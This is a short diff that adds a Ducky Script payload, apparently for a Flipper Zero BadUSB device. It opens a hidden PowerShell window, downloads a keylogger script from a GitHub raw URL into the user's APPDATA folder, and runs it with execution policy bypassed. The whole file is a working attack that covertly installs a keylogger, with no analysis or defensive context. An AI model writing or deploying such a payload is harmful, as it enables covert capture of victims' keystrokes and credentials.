@@ -1,0 +1,10 @@
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ZiteDesigns/Flipper-zero-Bad-USB-Key-Logger/main/keylogger.ps1" -OutFile "$env:APPDATA\kl.ps1"
+ENTER
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "$env:APPDATA\kl.ps1"
+ENTER
